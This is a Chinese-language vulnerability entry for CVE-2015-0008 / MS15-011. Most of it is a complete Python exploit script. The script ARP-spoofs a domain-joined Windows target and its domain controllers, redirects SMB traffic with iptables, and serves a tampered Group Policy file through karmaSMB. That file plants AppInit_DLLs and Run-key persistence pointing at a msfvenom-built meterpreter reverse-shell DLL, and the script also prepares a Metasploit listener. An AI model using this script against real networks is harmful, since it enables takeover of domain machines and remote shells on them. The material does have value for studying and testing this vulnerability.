# CVE-2015-0008  #
## 受影响版本 ##
Microsoft Windows Server 2003 SP2，Windows Vista SP2，Windows Server 2008 SP2和R2 SP1，Windows 7 SP1，Windows 8，Windows 8.1，Windows Server 2012 Gold和R2，Windows RT Gold和8.1
## 平台 ##
windows
## 测试系统 ##
windows 8
## 类型 ##
远程
## 描述 ##
 当已加入域的系统连接到域控制器时，在组策略如何接收和应用策略数据方面存在远程代码执行漏洞。成功利用此漏洞的攻击者可以完全控制受影响的系统。
## POC ##
<pre class="prettyprit lang-javascript">
import argparse
import os
import subprocess
import socket
import fcntl
import struct
 
# MS15-011 Exploit.
# For more information and any updates/additions this exploit see the following Git Repo: https://github.com/Freakazoidile/Exploit_Dev/tree/master/MS15-011
# Example usage: python3 ms15-011.py -t 172.66.10.2 -d 172.66.10.10 -i eth1
# Example usage with multiple DC&#x27;s: python3 ms15-011.py -t 172.66.10.2 -d 172.66.10.10 -d 172.66.10.11 -d 172.66.10.12 -i eth1
# Questions @Freakazoidile on twitter or make an issue on the GitHub repo. Enjoy.
 
def arpSpoof(interface, hostIP, targetIP):
    arpCmd = &quot;arpspoof -i %s %s %s &quot; % (interface, hostIP, targetIP)
    arpArgs = arpCmd.split()
    print(&quot;Arpspoofing: %s&quot; % (arpArgs))
    p = subprocess.Popen(arpArgs, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
     
def karmaSMB(hostIP):
    print(&quot;reverting GptTmpl.inf from bak&quot;)
    os.system(&quot;cp GptTmpl.inf.bak GptTmpl.inf&quot;)
    appInit = &#x27;MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs=1,&quot;\\\\%s\\SYSVOL\\share.dll&quot;\r\n&#x27; % (hostIP)
    CURunKey = &#x27;MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Key=1,&quot;rundll32.exe \\\\%s\\SYSVOL\\share.dll&quot;,1\r\n&#x27; % (hostIP)
    f = open(&quot;GptTmpl.inf&quot;,&quot;a&quot;, encoding=&#x27;utf-16le&#x27;)
    f.write(appInit)
    f.write(CURunKey)
    f.close()
     
    path = os.getcwd()
     
    fConfig = open(&quot;smb.conf&quot;,&quot;w&quot;)
    fConfig.write(&quot;ini = &quot;+path+&quot;/gpt.ini\ninf = &quot;+path+&quot;/GptTmpl.inf\ndll = &quot;+path+&quot;/shell.dll\n&quot;)
    fConfig.close()
 
    karmaCmd = &quot;python karmaSMB.py -config smb.conf -smb2support ./ &quot;
    os.system(karmaCmd)
 
 
def iptables_config(targetIP, hostIP):
    print(&#x27;[+] Running command: echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward&#x27;)
    print(&#x27;[+] Running command: iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 445 -j DNAT --to-destination %s&#x27; % (targetIP, hostIP))
    print(&#x27;[+] Running command: iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 139 -j DNAT --to-destination %s&#x27; % (targetIP, hostIP))
    print(&#x27;[+] Running command: iptables -t nat -A POSTROUTING -j MASQUERADE&#x27;)
    os.system(&#x27;echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward&#x27;)
    os.system(&#x27;iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 445 -j DNAT --to-destination %s&#x27; % (targetIP, hostIP))
    os.system(&#x27;iptables -t nat -A PREROUTING -p tcp -s %s --destination-port 139 -j DNAT --to-destination %s&#x27; % (targetIP, hostIP))
    os.system(&#x27;iptables -t nat -A POSTROUTING -j MASQUERADE&#x27;)
 
 
def get_interface_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack(&#x27;256s&#x27;, bytes(ifname[:15], &#x27;utf-8&#x27;)))[20:24])
 
def generatePayload(lhost, lport):
    print(&quot;generating payload(s) and metasploit resource file&quot;)
    msfDll = &quot;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=%s lport=%s -f dll -o shell.dll&quot; % (lhost, lport)
    os.system(msfDll)
    msfResource = &quot;use multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset lhost %s\nset lport %s\nset exitonsession false\nexploit -j\n&quot; % (lhost, lport)
    print(&quot;metasploit resource script: %s&quot; % msfResource)
    print (&quot;metasploit resource script written to meta_resource.rc type &#x27;msfconsole -r meta_resource.rc&#x27; to launch metasploit and stage a listener automatically&quot;)
     
    file = open(&quot;meta_resource.rc&quot;, &quot;w+&quot;)
    file.write(msfResource)
    file.close()
         
 
 
if __name__ == &#x27;__main__&#x27;:
 
    parser = argparse.ArgumentParser()
 
    # Add arguments
    parser.add_argument(&quot;-t&quot;, &quot;--target_ip&quot;, help=&quot;The IP of the target machine vulnerable to ms15-011/14&quot;, required=True)
    parser.add_argument(&quot;-d&quot;, &quot;--domain_controller&quot;, help=&quot;The IP of the domain controller(s) in the target domain. Use this argument multiple times when multiple domain contollers are preset.\nE.G: -d 172.66.10.10 -d 172.66.10.11&quot;, action=&#x27;append&#x27;, required=True)
    parser.add_argument(&quot;-i&quot;, &quot;--interface&quot;, help=&quot;The interface to use. E.G eth0&quot;, required=True)
    parser.add_argument(&quot;-l&quot;, &quot;--lhost&quot;, help=&quot;The IP to listen for incoming connections on for reverse shell. This is optional, uses the IP from the provided interface by default. E.G 192.168.5.1&quot;, required=False)
    parser.add_argument(&quot;-p&quot;, &quot;--lport&quot;, help=&quot;The port to listen connections on for reverse shell. If not specified 4444 is used. E.G 443&quot;, required=False)
 
    args = parser.parse_args()
 
    # Check for KarmaSMB and GptTmpl.inf.bak, if missing download git repo with these files.
    print (&quot;checking for missing file(s)&quot;)
    if not os.path.isfile(&quot;karmaSMB.py&quot;) and not os.path.isfile(&quot;GptTmpl.inf.bak&quot;):
        print(&quot;Requirements missing. Downloading required files from github&quot;)
        os.system(&quot;git clone https://github.com/Freakazoidile/MS15-011-Files&quot;)
        os.system(&quot;mv MS15-011-Files/* . &amp;&amp; rm -rf MS15-011-Files/&quot;)
 
    # Get the provided interfaces IP address
    ipAddr = get_interface_address(args.interface)
 
    if args.lhost is not None:
        lhost = args.lhost
    else:
        lhost = ipAddr
 
    if args.lport is not None:
        lport = args.lport
    else:
        lport = &#x27;4444&#x27;
     
 
    dcSpoof = &quot;&quot;
    dcCommaList = &quot;&quot;
    count = 0
   
    # loop over the domain controllers, poison each and target the host IP
    # create a comma separated list of DC&#x27;s
    # create a &quot;-t&quot; separate list of DC&#x27;s for use with arpspoof
    for dc in args.domain_controller:
        dcSpoof += &quot;-t %s &quot; % (dc)
        if count &gt; 0: 
            dcCommaList += &quot;,%s&quot; % (dc)
        else:
            dcCommaList += &quot;%s&quot; % (dc)
 
        arpSpoof(args.interface, dc, &quot;-t %s&quot; % (args.target_ip))
        count += 1
 
    # arpspoof the target and all of the DC&#x27;s
    arpSpoof(args.interface, args.target_ip, dcSpoof)
 
    # generate payloads
    generatePayload(lhost, lport)
 
    # Setup iptables forwarding rules
    iptables_config(args.target_ip, ipAddr)
 
    #run Karmba SMB Server
    karmaSMB(ipAddr)
    
     
    print(&quot;Targeting %s by arp spoofing %s and domain controllers: %s &quot; % (args.target_ip, args.target_ip, args.domain_controllers))
    print(&quot;If you interupt/stop the exploit ensure you stop all instances of arpspoof and flush firewall rules!&quot;)
</pre>